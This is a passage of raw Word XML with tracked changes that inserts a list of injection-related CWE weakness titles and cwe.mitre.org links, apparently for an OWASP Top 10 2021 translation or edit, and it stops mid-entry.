          <w:ins w:id="1490" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1491" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-77: Improper Neutralization of Special Elements used in a Command ('Command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https://cwe.mitre.org/data/definitions/77.html)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5DB8ED06" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1492" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1493" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command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https://cwe.mitre.org/data/definitions/78.html)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1A69F100" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1494" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://cwe.mitre.org/data/definitions/</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>79.html)</w:t>
      </w:r>
      <w:ins w:id="1495" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="76ACF7A6" w14:textId="77777777" w:rsidR="00A05092" w:rsidRDefault="00225B64" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1496" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1497" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00225B64">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6D4F3D1A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1498" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1499" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS</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https://cwe.mitre.org/data/definitions/80.html)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="13E7FFD1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1500" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1501" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-83: Improper Neutralization of Script in Attributes in a Web </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Page](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/83.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="464DA1A8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1502" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1503" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-87: Improper Neutralization of Alternate XSS </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Syntax](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/87.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2B3F94BB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1504" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1505" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument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https://cwe.mitre.org/data/definitions/88.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="41399696" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1506" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1507" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL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https://cwe.mitre.org/data/definitions/89.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5952CB5D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1508" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1509" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP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https://cwe.mitre.org/data/definitions/90.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="58508494" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1510" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1511" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-91: XML Injection (aka Blind XPath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https://cwe.mitre.org/data/definitions/91.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="23FAFAC8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1512" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1513" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-93: Improper Neutralization of CRLF Sequences ('CRLF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https://cwe.mitre.org/data/definitions/93.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6E739C67" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1514" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1515" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-94: Improper Control of Generation of Code ('Code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https://cwe.mitre.org/data/definitions/94.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6443FBC6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1516" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1517" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval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https://cwe.mitre.org/data/definitions/95.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1F1ECB8D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1518" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1519" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code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https://cwe.mitre.org/data/definitions/96.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7B7393EB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1520" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1521" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-97: Improper Neutralization of Server-Side Includes (SSI) Within a Web </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Page](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/97.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1BFEAB50" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1522" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1523" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion'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https://cwe.mitre.org/data/definitions/98.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="13FEE92B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1524" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1525" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-99: Improper Control of Resource Identifiers ('Resource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https://cwe.mitre.org/data/definitions/99.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3543C694" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1526" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1527" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">- [CWE-100: Deprecated: Was catch-all for input validation </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>issues](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/100.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0425D8D6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1528" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1529" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting'</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https://cwe.mitre.org/data/definitions/113.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3AFC3EA4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1530" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1531" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-116: Improper Encoding or Escaping of </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Output](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/116.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="79FBFC8E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1532" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1533" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-138: Improper Neutralization of Special </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Elements](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/138.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5314D1C4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1534" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1535" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-184: Incomplete List of Disallowed </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Inputs](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/184.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="60C0218B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1536" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1537" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection'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https://cwe.mitre.org/data/definitions/470.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="45D3CD6D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1538" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1539" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-471: Modification of Assumed-Immutable Data (MAID</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https://cwe.mitre.org/data/definitions/471.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="697CB912" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1540" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1541" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-564: SQL Injection: </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Hibernate](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
